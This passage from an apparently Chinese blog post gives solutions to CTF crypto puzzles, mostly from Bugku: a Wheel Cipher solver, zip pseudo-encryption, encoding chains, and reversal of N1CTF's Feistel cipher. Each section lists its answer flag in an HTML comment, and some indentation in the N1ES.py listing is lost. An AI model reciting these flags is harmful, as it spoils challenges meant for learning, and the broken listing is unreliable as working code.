class="string">''</span>),</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure></p><h2 id="通解"><a href="#通解" class="headerlink" title="通解"></a>通解</h2><p>这是2017 ISCC write up basic的Wheel Cipher,与Bugku这题类似<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">list1 = <span class="string">"""因为key的关系，所以这一行换行很重要</span></span><br><span class="line"><span class="string">ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ</span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP</span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG</span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG</span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">key = [<span class="number">2</span> ,<span class="number">3</span> ,<span class="number">7</span> ,<span class="number">5</span> ,<span class="number">13</span> ,<span class="number">12</span> ,<span class="number">9</span> ,<span class="number">1</span> ,<span class="number">8</span> ,<span class="number">10</span> ,<span class="number">4</span> ,<span class="number">11</span> ,<span class="number">6</span>]</span><br><span class="line">crypto = <span class="string">'NFQKSEVOQOFNP'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行操作</span></span><br><span class="line">list2 = []</span><br><span class="line">list1 = list1.splitlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    list2.append(list1[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将密文移动到第一列生成密码表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Table</span><span class="params">()</span>:</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        num = list2[i].find(crypto[i])</span><br><span class="line">        list = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> num &gt;= <span class="number">25</span>:</span><br><span class="line">                num -= <span class="number">26</span></span><br><span class="line">            list += list2[i][num]</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        table.append(list)</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span><span class="params">(table)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">            print(table[i][j] ,end=<span class="string">''</span>),</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    table = Table()</span><br><span class="line">    Flag(table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># FIREINTHEHOLE</span></span><br></pre></td></tr></table></figure></p><!--flag{xsxsbugkuadmin}--><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>伪加密参考：<a href="https://blog.csdn.net/pdsu161530247/article/details/73612910" target="_blank" rel="noopener">https://blog.csdn.net/pdsu161530247/article/details/73612910</a><br>用winhex打开flag.zip，09改成00，保存即可。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Crypto/11-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{Adm1N-B2G-kU-SZIP}--></p><h1 id="告诉你个秘密-ISCCCTF"><a href="#告诉你个秘密-ISCCCTF" class="headerlink" title="告诉你个秘密(ISCCCTF)"></a>告诉你个秘密(ISCCCTF)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">636A56355279427363446C4A49454A7154534230526D6843</span><br><span class="line">56445A31614342354E326C4B4946467A5769426961453067</span><br></pre></td></tr></table></figure><p>HEX转ASCII<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</span><br></pre></td></tr></table></figure></p><p>base64解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></figure></p><p>注意键盘上的位置，r5yG中间是t，以此类推答案就是tongyuan，<br>注意flag格式需要大写<br><!--TONGYUAN--></p><h1 id="这不是MD5"><a href="#这不是MD5" class="headerlink" title="这不是MD5"></a>这不是MD5</h1><p>16进制转字符串<br><!--flag{ae73587ba56baef5}--></p><h1 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h1><p>贝斯==base，家族应该不是64，其他类型<br>试来试去,base91解码成功：<a href="http://ctf.ssleye.com/base91.html" target="_blank" rel="noopener">Base91编码</a><br><!--flag{554a5058c9021c76}--></p><h1 id="富强民主"><a href="#富强民主" class="headerlink" title="富强民主"></a>富强民主</h1><p><a href="http://ctf.ssleye.com/cvencode.html" target="_blank" rel="noopener">核心价值观编码</a><br><!--flag{90025f7fb1959936}--></p><h1 id="Python-N1CTF"><a href="#Python-N1CTF" class="headerlink" title="Python(N1CTF)"></a>Python(N1CTF)</h1><p>开局得到两个脚本，需要去逆解。<br><figure class="highlight python"><figcaption><span>challenge.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> N1ES <span class="keyword">import</span> N1ES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">n1es = N1ES(key)</span><br><span class="line">flag = <span class="string">"N1CTF&#123;*****************************************&#125;"</span></span><br><span class="line">cipher = n1es.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(cipher)  <span class="comment"># HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx</span></span><br></pre></td></tr></table></figure></p><figure class="highlight py"><figcaption><span>N1ES.py </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    f = <span class="keyword">lambda</span> x, y: x + y - <span class="number">2</span> * (x &amp; y)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        res += chr(f(ord(a[i]), ord(b[i])))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutate</span><span class="params">(table, block)</span>:</span></span><br><span class="line"><span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bits</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    l = len(data) * <span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            result[(pos&lt;&lt;<span class="number">3</span>)+i] = (ch&gt;&gt;i) &amp; <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">54</span>, <span class="number">132</span>, <span class="number">138</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">187</span>, <span class="number">84</span>, <span class="number">146</span>, <span class="number">30</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">72</span>, <span class="number">161</span>, <span class="number">116</span>, <span class="number">63</span>, <span class="number">161</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">24</span>, <span class="number">126</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">30</span>, <span class="number">117</span>, <span class="number">185</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">140</span>, <span class="number">70</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">150</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">36</span>, <span class="number">90</span>, <span class="number">149</span>, <span class="number">54</span>, <span class="number">156</span>, <span class="number">8</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">110</span>, <span class="number">56</span>,<span class="number">1</span>, <span class="number">84</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">41</span>, <span class="number">99</span>, <span class="number">151</span>, <span class="number">119</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">166</span>, <span class="number">125</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">105</span>, <span class="number">133</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">29</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">81</span>, <span class="number">134</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">180</span>, <span class="number">78</span>, <span class="number">175</span>, <span class="number">108</span>, <span class="number">26</span>, <span class="number">121</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">142</span>, <span class="number">177</span>, <span class="number">143</span>, <span class="number">86</span>, <span class="number">129</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">34</span>, <span class="number">177</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">147</span>, <span class="number">90</span>, <span class="number">49</span>, <span class="number">135</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">19</span>, <span class="number">89</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">155</span>, <span class="number">83</span>, <span class="number">38</span>, <span class="number">159</span>, <span class="number">179</span>, <span class="number">19</span>, <span class="number">157</span>, <span class="number">68</span>, <span class="number">105</span>, <span class="number">151</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">122</span>, <span class="number">179</span>, <span class="number">114</span>, <span class="number">52</span>, <span class="number">183</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">161</span>, <span class="number">141</span>, <span class="number">18</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">81</span>, <span class="number">156</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">38</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">59</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">75</span>, <span class="number">164</span>, <span class="number">190</span>, <span class="number">140</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">188</span>, <span class="number">77</span>, <span class="number">165</span>, <span class="number">105</span>, <span class="number">5</span>, <span class="number">107</span>, <span class="number">31</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">162</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">158</span>, <span class="number">153</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">77</span>, <span class="number">156</span>, <span class="number">11</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">169</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">161</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">110</span>, <span class="number">191</span>, <span class="number">43</span>, <span class="number">82</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">102</span>, <span class="number">166</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">5</span>, <span class="number">189</span>, <span class="number">27</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(o)</span>:</span></span><br><span class="line">    k = permutate(s_box,o)</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(k), <span class="number">7</span>):</span><br><span class="line">        b.append(k[i:i+<span class="number">7</span>] + [<span class="number">1</span>])</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b[i]:</span><br><span class="line">x += (j&lt;&lt;pos)</span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">c.append((<span class="number">0x10001</span>**x) % (<span class="number">0x7f</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(key) != <span class="number">24</span> <span class="keyword">or</span> isinstance(key, bytes) == <span class="keyword">False</span> ):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"key must be 24 bytes long"</span>)</span><br><span class="line">        self.key = key</span><br><span class="line">        self.gen_subkey()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = string_to_bits(self.key)</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        o = generate(o)</span><br><span class="line">        k.extend(o)</span><br><span class="line">        o = string_to_bits([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> o[<span class="number">0</span>:<span class="number">24</span>]])</span><br><span class="line">        self.Kn = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            self.Kn.append(map(chr, k[i * <span class="number">8</span>: i * <span class="number">8</span> + <span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(plaintext) % <span class="number">16</span> != <span class="number">0</span> <span class="keyword">or</span> isinstance(plaintext, bytes) == <span class="keyword">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"plaintext must be a multiple of 16 in length"</span>)</span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">16</span>):</span><br><span class="line">            block = plaintext[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                L, R = R, (round_add(L, self.Kn[round_cnt]))</span><br><span class="line">            L, R = R, L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>加密过程和round_add都是可逆的，直接在源码文件中加入解密用代码如下：<br><figure class="highlight py"><figcaption><span>N1ES.py</span><a href="https://github.com/sixstars/ctf/tree/master/2018/n1ctf#baby_n1es" target="_blank" rel="noopener">sixstars's writeup</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_round_add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    f = <span class="keyword">lambda</span> x, y: x + y - <span class="number">2</span> * (x &amp; y)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        t1=ord(a[i])</span><br><span class="line">        t2=ord(b[i])</span><br><span class="line">        t3=<span class="number">-1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> f(t1,j)==t2:</span><br><span class="line">                t3=j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">assert</span> t3&gt;=<span class="number">0</span></span><br><span class="line">        res += chr(t3)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(plaintext) % <span class="number">16</span> != <span class="number">0</span> <span class="keyword">or</span> isinstance(plaintext, bytes) == <span class="keyword">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"plaintext must be a multiple of 16 in length"</span>)</span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">16</span>):</span><br><span class="line">            block = plaintext[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            L, R = R, L</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>)[::<span class="number">-1</span>]:</span><br><span class="line">                L, R = (re_round_add(R, self.Kn[round_cnt])), L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><p>然后修改challenge.py运行直接得到flag<br><figure class="highlight py"><figcaption><span>challenge.py</span><a href="https://github.com/sixstars/ctf/tree/master/2018/n1ctf#baby_n1es" target="_blank" rel="noopener">sixstars's writeup</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> N1ES <span class="keyword">import</span> N1ES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">n1es = N1ES(key)</span><br><span class="line">flag = <span class="string">"N1CTF&#123;*****************************************&#125;"</span></span><br><span class="line">cipher = n1es.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(cipher)  <span class="comment"># HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx</span></span><br><span class="line"></span><br><span class="line">t=<span class="string">'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'</span></span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line">s = n1es.decrypt(t)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><figure class="highlight py"><figcaption><span>N1ES.py</span><a href="https://blog.csdn.net/like98k/article/details/79542995" target="_blank" rel="noopener">郁离歌的writeup</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> N1ES <span class="keyword">import</span> N1ES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">n1es = N1ES(key)</span><br><span class="line">flag = <span class="string">"N1CTF&#123;*****************************************&#125;"</span></span><br><span class="line">t=<span class="string">'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'</span></span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line">s = n1es.encrypt(t)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    s = n1es.encrypt(s)</span><br><span class="line">    <span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><!--N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}--><h1 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h1><p>银河战队出击<br>flag格式 flag{字母小写}<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Crypto/13-01.jpg" alt="" title="" class="">                <p></p>            </figure><br>对照密码表得到flag，参考百度百科：<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%93%B6%E6%B2%B3%E5%AD%97%E6%AF%8D" target="_blank" rel="noopener">标准银河字母</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Crypto/13-02.jpg" alt="" title="" class="">                <p></p>            </figure><br><!--flag{nopqrst}--></p><h1 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h1><p>一看0和1以为是进制转换，但仔细观察发现长度不对，感觉更像是摩斯电码，于是用代码替换下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101'</span></span><br><span class="line">b=a.replace(<span class="string">'0'</span>,<span class="string">'-'</span>)</span><br><span class="line">b=b.replace(<span class="string">'1'</span>,<span class="string">'.'</span>)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">c=a.replace(<span class="string">'0'</span>,<span class="string">'.'</span>)</span><br><span class="line">c=c.replace(<span class="string">'1'</span>,<span class="string">'-'</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p><p>其中一种解码后得到flag<br><!-- flag{m0rse_code_1s_interest1n9!} --></p><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>一堆不同进制的数值，猜测是转成16进制再转成字符串<br><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">a=<span class="string">'d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e'</span></span><br><span class="line"></span><br><span class="line">list1 = []</span><br><span class="line">a=a.split(<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span 